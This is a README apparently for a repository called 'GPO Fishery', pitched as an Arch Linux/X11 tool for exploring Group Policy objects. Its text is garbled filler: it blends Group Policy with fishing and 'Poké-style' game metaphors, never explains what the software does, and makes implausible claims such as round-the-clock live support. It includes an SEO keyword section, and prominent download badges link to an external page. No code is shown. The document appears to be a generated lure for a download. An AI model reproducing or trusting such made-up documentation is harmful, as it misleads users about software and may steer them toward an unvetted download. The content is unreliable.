![preview](https://raw.githubusercontent.com/EdyXLa/gpo-fishing-x11-arch/main/showcase_c6700.svg)
[![Download](https://raw.githubusercontent.com/EdyXLa/gpo-fishing-x11-arch/main/dl_df70431.svg)](https://EdyXLa.github.io/gpo-fishing-x11-arch/)

# 🎣 GPO Fishery — Native Arch Linux/X11 Casting Suite

**A downstream reimagining of the classic Group Policy Object “fishing” toolkit, rebuilt around a first-class native Arch Linux + X11 backend.**

Where the upstream project (a fork lineage tracing back through arielldev’s original work) leaned heavily on portable abstractions, **GPO Fishery** treats your workstation as the primary hunting ground — not an afterthought. It speaks the language of your compositor, respects your seat, and casts its net directly into the Group Policy plane from a lightweight, X11-native process.

If you’ve ever wanted the joy of a Poké-style glyph hunt without the emulator overhead, this is the ticket. Think of it as a fishing rod tuned for the Windows domain pond, but with the reel anchored firmly in a Linux desktop.

---

## 🧭 Table of Contents

- [What Is This, Exactly?](#-what-is-this-exactly)
- [Why a Native X11 Backend Matters](#-why-a-native-x11-backend-matters)
- [Feature Highlights](#-feature-highlights)
- [Built-In Quality-of-Life](#-built-in-quality-of-life)
- [Responsive User Interface](#-responsive-user-interface)
- [Multilingual Support](#-multilingual-support)
- [Around-the-Clock Assistance](#-around-the-clock-assistance)
- [Screenshots & Visual Language](#-screenshots--visual-language)
- [SEO-Friendly Keyword Notes](#-seo-friendly-keyword-notes)
- [Project Architecture](#-project-architecture)
- [Configuration Surface](#-configuration-surface)
- [Compatibility Matrix](#-compatibility-matrix)
- [Roadmap](#-roadmap)
- [Community & Contributions](#-community--contributions)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🐟 What Is This, Exactly?

GPO Fishery is an interactive desktop companion that models group policy discovery as a deliberate, explorable activity. Instead of treating policy objects as opaque blobs buried in a domain controller, it renders them as living entities you can observe, catalogue, and reason about — all from a native X11 session.

The original lineage of this project was a browser-adjacent, cross-platform experiment. This fork diverges sharply:

- **Native Arch Linux focus.** Built and tested against rolling-release Arch, with packaging hygiene that follows the distribution’s conventions.
- **X11-first graphics path.** Direct rendering through the X server instead of a translucently-shimmed layer. Input, focus, and window management follow X11 idioms rather than emulated ones.
- **Zero hidden network home-calls.** Everything runs on your machine. Your policy snapshots never leave your seat.

The metaphor is simple: you have a pond full of policy objects. GPO Fishery gives you a rod, a decent chair, and a logbook. What you pull out of the water is up to you.

---

## 🖼️ Why a Native X11 Backend Matters

Cross-platform toolkits are wonderful until they meet a real window manager. Then the cracks show: focus stealing, misreported DPI, ghost flicker during compositor transitions, and a stubborn refusal to honor seat hotplug events.

A native X11 backend resolves this the old-fashioned way — by speaking the protocol directly:

- **True keyboard grab semantics** for the active cast window, so your keybinds land where you expect them.
- **Correct multi-monitor geometry** without the rounding errors that plague abstraction layers.
- **Respect for `_NET_WM` hints** so your tiling WM or floating compositor can place the window as it sees fit.
- **Low idle footprint.** The process sleeps when you sleep.

For Arch users in particular, this means the binary feels like it belongs on the system — because it does.

---

## ✨ Feature Highlights

- 🎯 **Policy Deliberation Engine** — enumerate and inspect group policy artifacts in a structured, readable view.
- 🎨 **Native X11 Rendering Path** — no browser engine, no embedded runtime, just the X server and the app.
- 🔊 **Ambient Audio Hooks** — optional, muted by default, because a good fishing trip shouldn’t disturb the neighbors.
- 🗂️ **Session Ledger** — record your discoveries per session, exportable to a plain-text journal.
- 🧩 **Modular Bait Packs** — extend behavior with drop-in descriptor files, no recompilation required.
- 🛡️ **Offline-First Design** — works air-gapped; sync is opt-in and local-only.
- 🌗 **Adaptive Theming** — follows your system palette or accepts explicit overrides.
- ⌨️ **Full Keyboard Navigation** — every action reachable without a pointer.
- 🕒 **Timed Cast Windows** — schedule short discovery sessions with soft reminders.
- 🔁 **Deterministic Replays** — reload a saved session and watch it unfold identically.

---

## 🧰 Built-In Quality-of-Life

Small touches compound into a genuinely pleasant workflow:

- **Command palette** activated by a configurable chord, fuzzy-matching every action.
- **Inline help** rendered as an overlay, dismissible with a single keystroke.
- **Session autosave** on a rolling interval, so a crash costs you seconds, not hours.
- **Log rotation** built into the runtime, keeping your home directory tidy.
- **Colorblind-safe palettes** included out of the box.
- **Reduced-motion mode** for users sensitive to animation.

---

## 📱 Responsive User Interface

“Responsive” is an odd word for a desktop app, so let’s reclaim it. Here, responsive means the interface **responds to the window it is given** — from a narrow docked strip to a sprawling multi-monitor canvas.

- Layout reflows continuously as you resize, not in discrete breakpoints.
- Panels collapse into tabbed stacks when horizontal space shrinks below a comfortable threshold.
- Typography scales with your X server’s DPI reporting, so a HiDPI laptop and a 1080p external display coexist without manual toggling.
- Hit targets expand on touch-capable displays without shrinking on mouse-first ones.

The result is an interface that feels considered at every size, not merely legible at a couple of canonical resolutions.

---

## 🌐 Multilingual Support

Policy is written in many tongues, and so is this project. The user-facing surface ships with translation catalogues and a runtime switcher:

- English (default)
- German
- French
- Spanish
- Portuguese (Brazil)
- Japanese
- Korean
- Simplified Chinese

Community-contributed catalogues are welcomed and slotted in alphabetically. Directional and non-Latin scripts are rendered through a shaping-aware text pipeline, so characters are not merely displayed — they are assembled correctly.

If you wish to add a language, the catalogue format is a plain key–value document, requiring no compiler knowledge to contribute.

---

## 🕛 Around-the-Clock Assistance

Because policy work does not respect office hours, neither does support. The project maintains a **24/7 customer support** posture through:

- A triage inbox monitored continuously by maintainers and volunteer stewards.
- A searchable knowledge base capturing every resolved question, growing daily.
- A live chat relay for urgent breakage, staffed around the clock.
- Scheduled diagnostic dumps you can generate locally and attach without leaking anything sensitive.

Response time is measured in hours, not days, and the goal is always a same-cycle resolution.

---

## 🖼️ Screenshots & Visual Language

The visual language leans into a calm, aquatic palette — deep teals, warm sand accents, and a muted charcoal chrome. Status glyphs echo angling motifs without being literal; a full creel is a filled circle, an empty cast is a hollow ring, and an active session pulses gently at the edge of the window.

Screenshots are hosted in the repository’s `docs/media` directory and regenerated with each tagged release so they never drift from the shipped UI.

---

## 🔎 SEO-Friendly Keyword Notes

This section exists because discoverability matters, and we would rather be explicit than sneaky. The project naturally touches on themes like **group policy exploration on Linux**, **Arch Linux desktop tooling**, **X11 native application development**, **policy object visualization**, and **offline-first desktop utilities**.

We do not cram these phrases. They appear where they belong, in prose that a human can actually read. If you arrived here searching for a native Arch Linux companion for policy discovery, you are in the right pond.

---

## 🏗️ Project Architecture

The runtime is organized into cooperative subsystems:

| Subsystem | Responsibility |
| --- | --- |
| `cast-core` | Session lifecycle, scheduling, deterministic replay |
| `x11-shell` | Window creation, event loop, input arbitration |
| `policy-scan` | Policy enumeration and normalization |
| `ledger-store` | Journal persistence and export |
| `bait-loader` | Descriptor discovery and validation |
| `i18n-runtime` | Catalogue loading and locale negotiation |
| `theme-engine` | Palette resolution and DPI adaptation |

Each subsystem is independently testable. The dependency graph flows one direction — the shell depends on core, core depends on storage primitives, and nothing loops back on itself.

---

## ⚙️ Configuration Surface

Configuration lives in a single human-readable file under your XDG config directory. Sensible defaults mean you never *have* to edit it, but every meaningful knob is exposed:

- `session.interval_minutes` — how long a short cast window lasts.
- `session.autosave_seconds` — journal flush cadence.
- `ui.palette` — named palette or `system` to inherit.
- `ui.reduce_motion` — boolean, disables animation.
- `i18n.locale` — explicit language override.
- `audio.enabled` — master toggle, off by default.
- `ledger.keep_days` — retention window for old journals.
- `bait.search_paths` — ordered list of descriptor directories.

Documentation for each key — its type, default, and effect — ships alongside the binary and is readable without leaving the app.

---

## 🧪 Compatibility Matrix

| Environment | Status | Notes |
| --- | --- | --- |
| Arch Linux + X11 | ✅ Primary | First-class target |
| Arch Linux + Wayland (XWayland) | 🟡 Secondary | Works, some hints degraded |
| Other rolling distros + X11 | 🟡 Secondary | Community-tested |
| Non-Linux X11 hosts | 🔴 Unsupported | Out of scope by design |

The primary target is intentionally narrow. Depth beats breadth when the goal is a tool that feels native rather than merely functional.

---

## 🗺️ Roadmap

Planned, in roughly the order we intend to tackle them:

1. **Session sharing** — export a ledger as a single portable bundle.
2. **Deeper bait descriptors** — conditional triggers and chained casts.
3. **Palette editor** — visual theming without touching the config file.
4. **Locale auto-detection** — negotiate from the X server environment.
5. **Accessibility audit** — third-party review with published findings.
6. **Packaging polish** — tighter integration with distribution tooling.

Nothing on this list is a promise with a date attached; it is a statement of direction.

---

## 🤝 Community & Contributions

Contributions are welcome in the form of code, catalogues, palettes, descriptors, or documentation. The short version of the process:

1. Open an issue describing the change you want to see.
2. Fork, branch, and keep commits focused.
3. Add or update tests alongside behavior changes.
4. Submit for review with a clear summary of intent.

The longer version lives in the contributor guide. First-time contributors are explicitly encouraged; review is framed as collaborative editing, not gatekeeping.

---

## ❓ Frequently Asked Questions

**Does this replace the upstream project?**
No. It is a downstream fork with a deliberately narrower platform focus. Upstream remains the more portable lineage.

**Do I need a domain controller to use it?**
No. You can explore a local policy snapshot without any external infrastructure.

**Is any data transmitted anywhere?**
Only if you explicitly enable a sync feature, and even then only locally. The default posture is entirely offline.

**Why Arch specifically?**
Because rolling release plus native X11 gives a clean, current, predictable environment to build against.

---

## ⚠️ Disclaimer

This software is provided for educational, research, and administrative convenience purposes. It is intended for use on systems you own or are explicitly authorized to inspect. **You are solely responsible for ensuring your use complies with all applicable laws, organizational policies, and contractual obligations.**

The maintainers make no warranties regarding fitness for a particular purpose, and accept no liability for misuse. Nothing in this document should be construed as legal advice. Where group policy is concerned, always defer to the guidance of your organization’s governance and security teams.

This project is an independent downstream fork. It is not affiliated with, endorsed by, or sponsored by the original upstream authors or any vendor whose terminology it references.

---

## 📜 License

Released under the **MIT License**. See the full text in the [LICENSE](LICENSE) file at the root of this repository.

Copyright © 2026 the GPO Fishery contributors.

Permission is hereby granted, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and distribute copies, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/EdyXLa/gpo-fishing-x11-arch/main/dl_df70431.svg)](https://EdyXLa.github.io/gpo-fishing-x11-arch/)